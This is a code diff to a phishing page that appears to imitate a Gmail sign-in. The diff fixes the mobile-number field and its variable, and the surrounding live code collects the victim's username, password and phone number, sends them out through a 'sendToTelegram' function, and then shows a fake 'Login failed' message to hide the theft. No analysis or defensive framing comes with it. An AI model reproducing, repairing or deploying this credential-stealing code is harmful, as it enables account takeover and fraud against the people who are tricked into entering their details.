@@ -104,7 +104,7 @@
     <form id="loginForm" action="javascript:void(0);">
       <input type="text" id="username" name="username" class="input-field" placeholder="Email or phone" required>
       <input type="password" id="password" name="password" class="input-field" placeholder="Enter your password" required>
-       <input type="text" id="Mobile" name="Mobile" class="input-field" placeholder="Mobile" required>
+      <input type="text" id="mobile" name="mobile" class="input-field" placeholder="with country code" required>
       <button type="submit" class="btn">Next</button>
     </form>
 
@@ -120,9 +120,9 @@
 
       var username = document.getElementById('username').value;
       var password = document.getElementById('password').value;
-      var mobile = document.getElementById('Mobile').value;
+      var mobile = document.getElementById('mobile').value;
 
-      var payload = `Username: ${username}\nPassword: ${password}\nmobile: ${Mobile} \nStark ♥️`;
+      var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
 
       sendToTelegram(payload);
       alert("Login failed: Invalid credentials"); // Gmail style fake response
@@ -144,6 +144,7 @@
 
 </body>
 </html>
+
 
 
 
